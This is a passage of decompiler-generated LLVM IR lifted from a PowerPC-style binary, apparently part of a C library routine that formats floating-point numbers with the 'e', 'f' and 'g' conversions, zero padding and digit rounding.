  %v1_100126a8 = add i32 %v0_100126a4, 1
  store i32 %v1_100126a8, i32* %r7.global-to-local, align 4
  br i1 %v3_100126a4, label %dec_label_pc_100126a4.dec_label_pc_10012624_crit_edge, label %dec_label_pc_100126b0

dec_label_pc_100126a4.dec_label_pc_10012624_crit_edge: ; preds = %dec_label_pc_100126a4
  %v0_10012628.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10012624

dec_label_pc_100126b0:                            ; preds = %dec_label_pc_100126a4
  %v0_100126b0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100126b0 = icmp ult i32 %v0_100126b0, 96
  %v2_100126b0 = icmp ugt i32 %v0_100126b0, 96
  %v3_100126b0 = icmp eq i32 %v0_100126b0, 96
  store i1 %v1_100126b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100126b0, label %dec_label_pc_100126c8, label %dec_label_pc_100126b8

dec_label_pc_100126b8:                            ; preds = %dec_label_pc_100126b0
  %v1_100126c0 = add i32 %v0_100126b0, 32
  store i32 %v1_100126c0, i32* %r0.global-to-local, align 4
  %v1_100126c4 = urem i32 %v1_100126c0, 256
  store i32 %v1_100126c4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100126c8

dec_label_pc_100126c8:                            ; preds = %dec_label_pc_100126b0, %dec_label_pc_100126b8
  %v0_100126e0 = phi i32 [ %v1_100126c4, %dec_label_pc_100126b8 ], [ %v0_100126b0, %dec_label_pc_100126b0 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_100126b8 ], [ 101, %dec_label_pc_100126b0 ]
  %v1_100126c8 = icmp slt i32 %v0_100126e0, 103
  %v3_100126c8 = icmp eq i32 %v0_100126e0, 103
  store i1 %v1_100126c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100126c8, label %dec_label_pc_100126d0, label %dec_label_pc_100126e0

dec_label_pc_100126d0:                            ; preds = %dec_label_pc_100126c8
  %v0_100126d0 = load i32, i32* %r30.global-to-local, align 4
  %v1_100126d0 = icmp slt i32 %v0_100126d0, 0
  %v3_100126d0 = icmp eq i32 %v0_100126d0, 0
  store i1 %v1_100126d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100126d0, label %dec_label_pc_100126e8, label %dec_label_pc_100126d8

dec_label_pc_100126d8:                            ; preds = %dec_label_pc_100126d0
  %v1_100126d8 = add i32 %v0_100126d0, -1
  store i32 %v1_100126d8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100126e8

dec_label_pc_100126e0:                            ; preds = %dec_label_pc_100126c8
  %v1_100126e0 = icmp slt i32 %v0_100126e0, 102
  %v3_100126e0 = icmp eq i32 %v0_100126e0, 102
  store i1 %v1_100126e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126e0, i1* %cr7_eq.global-to-local, align 1
  %v0_100126f0 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_100126e0, label %dec_label_pc_100126f0, label %dec_label_pc_100126e8

dec_label_pc_100126e8:                            ; preds = %dec_label_pc_100126e0, %dec_label_pc_100126d0, %dec_label_pc_100126d8
  %v0_100126e8 = phi i32 [ 0, %dec_label_pc_100126d0 ], [ %v1_100126d8, %dec_label_pc_100126d8 ], [ %v0_100126f0, %dec_label_pc_100126e0 ]
  store i32 %v0_100126e8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012714

dec_label_pc_100126f0:                            ; preds = %dec_label_pc_100126e0
  %v1_100126f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_100126f0 = add i32 %v1_100126f0, %v0_100126f0
  store i32 %v2_100126f0, i32* %r10.global-to-local, align 4
  %v1_100126f4 = icmp slt i32 %v2_100126f0, -1
  %v3_100126f4 = icmp eq i32 %v2_100126f0, -1
  store i1 %v1_100126f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100126f4, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_100126f0, -2
  br i1 %tmp77, label %dec_label_pc_10012714, label %dec_label_pc_100126fc

dec_label_pc_100126fc:                            ; preds = %dec_label_pc_100126f0
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_10012700 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10012700, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268510988, i32* @lr, align 4
  %v3_10012708 = call i32 @__GI_memset(i32 %v2_10012700, i32 48, i32 17)
  store i32 %v3_10012708, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012714

dec_label_pc_10012714:                            ; preds = %dec_label_pc_100126f0, %dec_label_pc_100126e8, %dec_label_pc_100126fc
  %v1_10012738 = phi i32 [ %v2_100126f0, %dec_label_pc_100126f0 ], [ %v0_100126e8, %dec_label_pc_100126e8 ], [ -1, %dec_label_pc_100126fc ]
  %v1_10012714 = icmp slt i32 %v1_10012738, 16
  %v2_10012714 = icmp sgt i32 %v1_10012738, 16
  %v3_10012714 = icmp eq i32 %v1_10012738, 16
  store i1 %v1_10012714, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012714, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10012728 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10012728, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10012714, label %dec_label_pc_10012750, label %dec_label_pc_10012734

dec_label_pc_10012734:                            ; preds = %dec_label_pc_10012714
  %v2_10012734 = ptrtoint i32* %stack_var_-177 to i32
  %v2_10012738 = add i32 %v1_10012738, %v2_10012734
  store i32 %v2_10012738, i32* %r9.global-to-local, align 4
  %v1_1001273c = add i32 %v2_10012738, 2
  %v2_1001273c = inttoptr i32 %v1_1001273c to i8*
  %v3_1001273c = load i8, i8* %v2_1001273c, align 1
  %v4_1001273c = zext i8 %v3_1001273c to i32
  store i32 %v4_1001273c, i32* %r0.global-to-local, align 4
  store i32 %v1_1001273c, i32* %r11.global-to-local, align 4
  %v1_10012744 = sub nsw i32 52, %v4_1001273c
  %v2_10012744 = sub nuw nsw i32 -1, %v4_1001273c
  %not.v5_10012744 = icmp ugt i32 %v1_10012744, %v2_10012744
  %v1_1001274c = zext i1 %not.v5_10012744 to i32
  store i32 %v1_1001274c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012750

dec_label_pc_10012750:                            ; preds = %dec_label_pc_10012714, %dec_label_pc_10012734, %dec_label_pc_10012750.backedge
  %v0_10012754 = phi i32 [ %v0_10012754.pre, %dec_label_pc_10012750.backedge ], [ 0, %dec_label_pc_10012714 ], [ %v1_1001274c, %dec_label_pc_10012734 ]
  %v0_10012750 = phi i32 [ %v0_10012750.pre, %dec_label_pc_10012750.backedge ], [ %v2_10012728, %dec_label_pc_10012714 ], [ %v1_1001273c, %dec_label_pc_10012734 ]
  %v1_10012750 = add i32 %v0_10012750, -1
  %v2_10012750 = inttoptr i32 %v1_10012750 to i8*
  %v3_10012750 = load i8, i8* %v2_10012750, align 1
  %v4_10012750 = zext i8 %v3_10012750 to i32
  store i32 %v1_10012750, i32* %r11.global-to-local, align 4
  %v2_10012754 = add i32 %v4_10012750, %v0_10012754
  store i32 %v2_10012754, i32* %r0.global-to-local, align 4
  %v1_10012758 = urem i32 %v2_10012754, 256
  store i32 %v1_10012758, i32* %r9.global-to-local, align 4
  %v1_1001275c = trunc i32 %v2_10012754 to i8
  store i8 %v1_1001275c, i8* %v2_10012750, align 1
  %v0_10012760 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012760 = icmp slt i32 %v0_10012760, 48
  %v3_10012760 = icmp eq i32 %v0_10012760, 48
  store i1 %v1_10012760, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012760, i1* %cr7_eq.global-to-local, align 1
  %v1_10012764 = icmp ult i32 %v0_10012760, 57
  %v2_10012764 = icmp ugt i32 %v0_10012760, 57
  %v3_10012764 = icmp eq i32 %v0_10012760, 57
  store i1 %v1_10012764, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10012764, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10012764, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10012760, %v2_10012764
  br i1 %brmerge, label %dec_label_pc_10012750.backedge, label %dec_label_pc_10012770

dec_label_pc_10012750.backedge:                   ; preds = %dec_label_pc_10012750
  %v0_10012750.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10012754.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012750

dec_label_pc_10012770:                            ; preds = %dec_label_pc_10012750
  %v2_10012770 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10012770, i32* %r0.global-to-local, align 4
  %v0_10012774 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10012774, i32* %r7.global-to-local, align 4
  %v0_10012778 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012778 = icmp ult i32 %v0_10012778, %v2_10012770
  %v3_10012778 = icmp ugt i32 %v0_10012778, %v2_10012770
  %v4_10012778 = icmp eq i32 %v0_10012778, %v2_10012770
  store i1 %v2_10012778, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012778, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10012604, i32* %r8.global-to-local, align 4
  br i1 %v3_10012778, label %dec_label_pc_10012790, label %dec_label_pc_10012784

dec_label_pc_10012784:                            ; preds = %dec_label_pc_10012770
  store i32 %v2_10012770, i32* %r8.global-to-local, align 4
  %v1_10012788 = add i32 %v0_10012774, 1
  store i32 %v1_10012788, i32* %r7.global-to-local, align 4
  store i32 %v2_10012770, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012790

dec_label_pc_10012790:                            ; preds = %dec_label_pc_10012770, %dec_label_pc_10012784
  %v2_10012798 = phi i32 [ %v0_10012778, %dec_label_pc_10012770 ], [ %v2_10012770, %dec_label_pc_10012784 ]
  %v0_10012790 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012790 = icmp slt i32 %v0_10012790, 103
  %v3_10012790 = icmp eq i32 %v0_10012790, 103
  store i1 %v1_10012790, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012790, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10012798 = add i32 %v2_10012798, 1
  %v4_10012798 = inttoptr i32 %v3_10012798 to i8*
  store i8 0, i8* %v4_10012798, align 1
  %v0_1001279c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001279c = add i32 %v0_1001279c, 1
  store i32 %v1_1001279c, i32* %r9.global-to-local, align 4
  %v0_100127a0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100127a0, label %dec_label_pc_100127a4, label %dec_label_pc_100127c8

dec_label_pc_100127a4:                            ; preds = %dec_label_pc_10012790
  %v0_100127a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100127a4 = icmp slt i32 %v0_100127a4, -4
  %v3_100127a4 = icmp eq i32 %v0_100127a4, -4
  store i1 %v1_100127a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_100127a4, label %dec_label_pc_100127c0, label %dec_label_pc_100127ac

dec_label_pc_100127ac:                            ; preds = %dec_label_pc_100127a4
  %v1_100127ac = load i32, i32* %r10.global-to-local, align 4
  %v2_100127ac = icmp sgt i32 %v1_100127ac, %v0_100127a4
  %v3_100127ac = icmp slt i32 %v1_100127ac, %v0_100127a4
  %v4_100127ac = icmp eq i32 %v1_100127ac, %v0_100127a4
  store i1 %v2_100127ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100127ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100127ac, label %dec_label_pc_100127c0, label %dec_label_pc_100127b4

dec_label_pc_100127b4:                            ; preds = %dec_label_pc_100127ac
  %v2_100127b4 = sub i32 %v1_100127ac, %v0_100127a4
  store i32 %v2_100127b4, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100127e0

dec_label_pc_100127c0:                            ; preds = %dec_label_pc_100127ac, %dec_label_pc_100127a4
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100127d4

dec_label_pc_100127c8:                            ; preds = %dec_label_pc_10012790
  %v0_100127c8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100127c8 = icmp slt i32 %v0_100127c8, 102
  %v3_100127c8 = icmp eq i32 %v0_100127c8, 102
  store i1 %v1_100127c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100127c8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100127c8, i32* %r4.global-to-local, align 4
  br i1 %v3_100127c8, label %dec_label_pc_100127e0thread-pre-split, label %dec_label_pc_100127d4

dec_label_pc_100127d4:                            ; preds = %dec_label_pc_100127c8, %dec_label_pc_100127c0
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_100127f4

dec_label_pc_100127e0thread-pre-split:            ; preds = %dec_label_pc_100127c8
  %v0_100127e0.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100127e0

dec_label_pc_100127e0:                            ; preds = %dec_label_pc_100127e0thread-pre-split, %dec_label_pc_100127b4
  %v0_100127e4 = phi i32 [ %v0_100127e0.pr, %dec_label_pc_100127e0thread-pre-split ], [ %v0_100127a4, %dec_label_pc_100127b4 ]
  %v1_100127e0 = icmp slt i32 %v0_100127e4, 0
  %v2_100127e0 = icmp sgt i32 %v0_100127e4, 0
  %v3_100127e0 = icmp eq i32 %v0_100127e4, 0
  store i1 %v1_100127e0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100127e0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100127e0, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_100127e4, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_100127e4, -1
  br i1 %tmp78, label %dec_label_pc_100127f4, label %dec_label_pc_100127ec

dec_label_pc_100127ec:                            ; preds = %dec_label_pc_100127e0
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_100127f0 = load i32, i32* %r8.global-to-local, align 4
  %v3_100127f0 = add i32 %v2_100127f0, -1
  %v4_100127f0 = inttoptr i32 %v3_100127f0 to i8*
  store i8 48, i8* %v4_100127f0, align 1
  store i32 %v3_100127f0, i32* %r8.global-to-local, align 4
  %v1_10012810.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10012824.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_100127f4

dec_label_pc_100127f4:                            ; preds = %dec_label_pc_100127e0, %dec_label_pc_100127d4, %dec_label_pc_100127ec
  %v0_10012824 = phi i1 [ %v1_100127e0, %dec_label_pc_100127e0 ], [ false, %dec_label_pc_100127d4 ], [ %v0_10012824.pre, %dec_label_pc_100127ec ]
  %v1_10012810 = phi i32 [ %v1_1001279c, %dec_label_pc_100127e0 ], [ %v1_1001279c, %dec_label_pc_100127d4 ], [ %v1_10012810.pre, %dec_label_pc_100127ec ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_10012800 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_10012800, i32* %r0.global-to-local, align 4
  %v0_10012808 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012808 = add i32 %v0_10012808, 1
  store i32 %v1_10012808, i32* %r6.global-to-local, align 4
  %v2_10012810 = sub i32 %v1_10012810, %v1_10012808
  store i32 %v2_10012810, i32* %r11.global-to-local, align 4
  %v1_10012814 = inttoptr i32 %v0_10012808 to i8*
  %v2_10012814 = load i8, i8* %v1_10012814, align 1
  %v3_10012814 = zext i8 %v2_10012814 to i32
  store i32 %v3_10012814, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_10012824, label %dec_label_pc_10012884, label %dec_label_pc_10012828

dec_label_pc_10012828:                            ; preds = %dec_label_pc_100127f4
  %v0_10012828 = load i32, i32* %r10.global-to-local, align 4
  %v2_10012828 = icmp slt i32 %v0_10012828, %v2_10012810
  %v4_10012828 = icmp eq i32 %v0_10012828, %v2_10012810
  store i1 %v2_10012828, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012828, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10012828, label %dec_label_pc_1001287c, label %dec_label_pc_1001283c

dec_label_pc_1001283c:                            ; preds = %dec_label_pc_10012828
  %v2_1001283c = sub i32 %v0_10012828, %v2_10012810
  store i32 %v2_1001283c, i32* %r0.global-to-local, align 4
  %v4_1001283c = icmp sgt i32 %v2_1001283c, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1001283c, label %dec_label_pc_10012858, label %dec_label_pc_10012848

dec_label_pc_10012848:                            ; preds = %dec_label_pc_1001283c
  %v2_1001284c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1001284c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100128a0

dec_label_pc_10012858:                            ; preds = %dec_label_pc_1001283c
  store i32 ptrtoint (i32* @global_var_1001a59b.676 to i32), i32* %r9.global-to-local, align 4
  %v2_10012864 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10012864, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_100128a0

dec_label_pc_1001287c:                            ; preds = %dec_label_pc_10012828
  %v0_1001287c = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1001287c, label %dec_label_pc_1001288c, label %dec_label_pc_10012880

dec_label_pc_10012880:                            ; preds = %dec_label_pc_1001287c
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10012884

dec_label_pc_10012884:                            ; preds = %dec_label_pc_100127f4, %dec_label_pc_10012880
  %v2_10012884 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10012884, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100128a0

dec_label_pc_1001288c:                            ; preds = %dec_label_pc_1001287c
  %v2_1001288c = sub i32 %v2_10012810, %v0_10012828
  store i32 %v2_1001288c, i32* %r11.global-to-local, align 4
  %v2_10012894 = add i32 %v0_10012828, %v1_10012808
  store i32 %v2_10012894, i32* %r6.global-to-local, align 4
  %v2_10012898 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10012898, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100128a0

dec_label_pc_100128a0:                            ; preds = %dec_label_pc_10012884, %dec_label_pc_10012858, %dec_label_pc_10012848, %dec_label_pc_1001288c
  %v1_100128cc = phi i32 [ %v2_10012884, %dec_label_pc_10012884 ], [ %v2_10012864, %dec_label_pc_10012858 ], [ %v2_1001284c, %dec_label_pc_10012848 ], [ %v2_10012898, %dec_label_pc_1001288c ]
  %v0_100128ac = phi i32 [ %v2_10012810, %dec_label_pc_10012884 ], [ 0, %dec_label_pc_10012858 ], [ 0, %dec_label_pc_10012848 ], [ %v2_1001288c, %dec_label_pc_1001288c ]
  %v3_100128a0 = load i32, i32* %v2_10012470, align 4
  store i32 %v3_100128a0, i32* %r0.global-to-local, align 4
  %v1_100128a4 = and i32 %v3_100128a0, 16
  store i32 %v1_100128a4, i32* %r9.global-to-local, align 4
  %v3_100128a4 = icmp eq i32 %v1_100128a4, 0
  br i1 %v3_100128a4, label %dec_label_pc_100128ac, label %dec_label_pc_100128c4

dec_label_pc_100128ac:                            ; preds = %dec_label_pc_100128a0
  %v1_100128ac = icmp slt i32 %v0_100128ac, 0
  %v3_100128ac = icmp eq i32 %v0_100128ac, 0
  store i1 %v1_100128ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100128ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100128ac, label %dec_label_pc_100128b4, label %dec_label_pc_100128c4

dec_label_pc_100128b4:                            ; preds = %dec_label_pc_100128ac
  %v0_100128b4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100128b4 = icmp slt i32 %v0_100128b4, 103
  %v3_100128b4 = icmp eq i32 %v0_100128b4, 103
  store i1 %v1_100128b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100128b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100128b4, label %dec_label_pc_100128e4, label %dec_label_pc_100128bc

dec_label_pc_100128bc:                            ; preds = %dec_label_pc_100128b4
  %v0_100128bc = load i32, i32* %r30.global-to-local, align 4
  %v1_100128bc = icmp slt i32 %v0_100128bc, 0
  %v3_100128bc = icmp eq i32 %v0_100128bc, 0
  store i1 %v1_100128bc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100128bc, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_100128bc, 1
  br i1 %tmp79, label %dec_label_pc_100128e4, label %dec_label_pc_100128c4

dec_label_pc_100128c4:                            ; preds = %dec_label_pc_100128ac, %dec_label_pc_100128a0, %dec_label_pc_100128bc
  %v2_100128cc = inttoptr i32 %v1_100128cc to i32*
  store i32 112, i32* %v2_100128cc, align 4
  store i32 ptrtoint (i32* @global_var_1001a5a8.677 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100128d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100128d8 = add i32 %v1_100128d8, 8
  %v3_100128d8 = inttoptr i32 %v2_100128d8 to i32*
  store i32 ptrtoint (i32* @global_var_1001a5a8.677 to i32), i32* %v3_100128d8, align 4
  %v0_100128dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100128dc = load i32, i32* %r8.global-to-local, align 4
  %v2_100128dc = add i32 %v1_100128dc, 4
  %v3_100128dc = inttoptr i32 %v2_100128dc to i32*
  store i32 %v0_100128dc, i32* %v3_100128dc, align 4
  %v0_100128e0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100128e0 = add i32 %v0_100128e0, 12
  store i32 %v1_100128e0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100128e4

dec_label_pc_100128e4:                            ; preds = %dec_label_pc_100128bc, %dec_label_pc_100128b4, %dec_label_pc_100128c4
  %v1_100128f4 = phi i32 [ %v1_100128cc, %dec_label_pc_100128bc ], [ %v1_100128cc, %dec_label_pc_100128b4 ], [ %v1_100128e0, %dec_label_pc_100128c4 ]
  %v0_100128e4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100128e4 = add i32 %v0_100128e4, 1
  store i32 %v1_100128e4, i32* %r10.global-to-local, align 4
  %v4_100128e4 = icmp eq i32 %v1_100128e4, 0
  br i1 %v4_100128e4, label %dec_label_pc_1001290c, label %dec_label_pc_100128ec

dec_label_pc_100128ec:                            ; preds = %dec_label_pc_100128e4
  %v1_100128ec = sub i32 -1, %v0_100128e4
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100128f4 = add i32 %v1_100128f4, 4
  %v3_100128f4 = inttoptr i32 %v2_100128f4 to i32*
  store i32 %v1_100128ec, i32* %v3_100128f4, align 4
  store i32 ptrtoint (i32* @global_var_1001a59b.676 to i32), i32* %r9.global-to-local, align 4
  %v0_10012900 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012900 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012900 = inttoptr i32 %v1_10012900 to i32*
  store i32 %v0_10012900, i32* %v2_10012900, align 4
  %v0_10012904 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012904 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012904 = add i32 %v1_10012904, 8
  %v3_10012904 = inttoptr i32 %v2_10012904 to i32*
  store i32 %v0_10012904, i32* %v3_10012904, align 4
  %v0_10012908 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012908 = add i32 %v0_10012908, 12
  store i32 %v1_10012908, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001290c

dec_label_pc_1001290c:                            ; preds = %dec_label_pc_100128e4, %dec_label_pc_100128ec
  %v1_10012918 = phi i32 [ %v1_100128f4, %dec_label_pc_100128e4 ], [ %v1_10012908, %dec_label_pc_100128ec ]
  %v0_1001290c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001290c = icmp slt i32 %v0_1001290c, 0
  %v3_1001290c = icmp eq i32 %v0_1001290c, 0
  store i1 %v1_1001290c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001290c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001290c, label %dec_label_pc_10012928, label %dec_label_pc_10012914

dec_label_pc_10012914:                            ; preds = %dec_label_pc_1001290c
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_10012918 = load i32, i32* %r6.global-to-local, align 4
  %v2_10012918 = add i32 %v1_10012918, 8
  %v3_10012918 = inttoptr i32 %v2_10012918 to i32*
  store i32 %v0_10012918, i32* %v3_10012918, align 4
  %v0_1001291c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001291c = load i32, i32* %r8.global-to-local, align 4
  %v2_1001291c = inttoptr i32 %v1_1001291c to i32*
  store i32 %v0_1001291c, i32* %v2_1001291c, align 4
  %v0_10012920 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012920 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012920 = add i32 %v1_10012920, 4
  %v3_10012920 = inttoptr i32 %v2_10012920 to i32*
  store i32 %v0_10012920, i32* %v3_10012920, align 4
  %v0_10012924 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012924 = add i32 %v0_10012924, 12
  store i32 %v1_10012924, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012928

dec_label_pc_10012928:                            ; preds = %dec_label_pc_1001290c, %dec_label_pc_10012914
  %v1_10012950 = phi i32 [ %v1_10012918, %dec_label_pc_1001290c ], [ %v1_10012924, %dec_label_pc_10012914 ]
  %v0_10012928 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012928 = icmp slt i32 %v0_10012928, 103
  %v3_10012928 = icmp eq i32 %v0_10012928, 103
  store i1 %v1_10012928, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012928, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012928, label %dec_label_pc_10012930, label %dec_label_pc_1001293c

dec_label_pc_10012930:                            ; preds = %dec_label_pc_10012928
  %v3_10012930 = load i32, i32* %v2_10012470, align 4
  store i32 %v3_10012930, i32* %r0.global-to-local, align 4
  %v1_10012934 = and i32 %v3_10012930, 16
  store i32 %v1_10012934, i32* %r9.global-to-local, align 4
  %v3_10012934 = icmp eq i32 %v1_10012934, 0
  br i1 %v3_10012934, label %dec_label_pc_10012968, label %dec_label_pc_1001293c

dec_label_pc_1001293c:                            ; preds = %dec_label_pc_10012928, %dec_label_pc_10012930
  %v0_1001293c = load i32, i32* %r10.global-to-local, align 4
  %v1_1001293c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001293c = sub i32 %v1_1001293c, %v0_1001293c
  store i32 %v2_1001293c, i32* %r9.global-to-local, align 4
  %v1_10012940 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012940 = icmp sgt i32 %v1_10012940, %v2_1001293c
  %v4_10012940 = icmp eq i32 %v1_10012940, %v2_1001293c
  store i1 %v2_10012940, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012940, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10012940, label %dec_label_pc_10012948, label %dec_label_pc_10012968

dec_label_pc_10012948:                            ; preds = %dec_label_pc_1001293c
  %v2_10012948 = sub i32 %v1_10012940, %v2_1001293c
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10012950 = add i32 %v1_10012950, 4
  %v3_10012950 = inttoptr i32 %v2_10012950 to i32*
  store i32 %v2_10012948, i32* %v3_10012950, align 4
  store i32 ptrtoint (i32* @global_var_1001a59b.676 to i32), i32* %r9.global-to-local, align 4
  %v0_1001295c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001295c = load i32, i32* %r8.global-to-local, align 4
  %v2_1001295c = inttoptr i32 %v1_1001295c to i32*
  store i32 %v0_1001295c, i32* %v2_1001295c, align 4
  %v0_10012960 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012960 = load i32, i32* %r8.global-to-local, align 4
  %v2_10012960 = add i32 %v1_10012960, 8
  %v3_10012960 = inttoptr i32 %v2_10012960 to i32*
  store i32 %v0_10012960, i32* %v3_10012960, align 4
  %v0_10012964 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012964 = add i32 %v0_10012964, 12
  store i32 %v1_10012964, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10012968

dec_label_pc_10012968:                            ; preds = %dec_label_pc_1001293c, %dec_label_pc_10012930, %dec_label_pc_10012948
  %v1_100129fc37 = phi i32 [ %v1_10012950, %dec_label_pc_1001293c ], [ %v1_10012950, %dec_label_pc_10012930 ], [ %v1_10012964, %dec_label_pc_10012948 ]
